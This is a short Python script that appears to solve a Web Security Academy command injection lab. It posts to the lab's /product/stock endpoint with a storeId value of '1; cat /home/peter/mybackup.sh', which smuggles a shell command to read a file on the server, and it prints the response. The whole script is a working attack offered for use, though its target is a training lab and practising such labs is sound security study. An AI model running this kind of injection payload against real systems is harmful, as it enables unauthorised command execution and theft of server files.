import requests

site = '0a2b000c0317b9c280b4a83e0081004d.web-security-academy.net'  # Replace with your lab instance
stock_post_url = f'https://{site}/product/stock'

s = requests.Session()

# Legitimate productId and storeId from manual recon
product_id = '1'     
store_id = '1'       # Inject payload here

# Modify storeId to inject `cat` command
payload = '1; cat /home/peter/mybackup.sh'   # <- Command Injection Payload

# Post Data
post_data = {
    'productId': product_id,
    'storeId': payload
}

# Send the malicious request
resp = s.post(stock_post_url, data=post_data)

# Print response
print(resp.text)
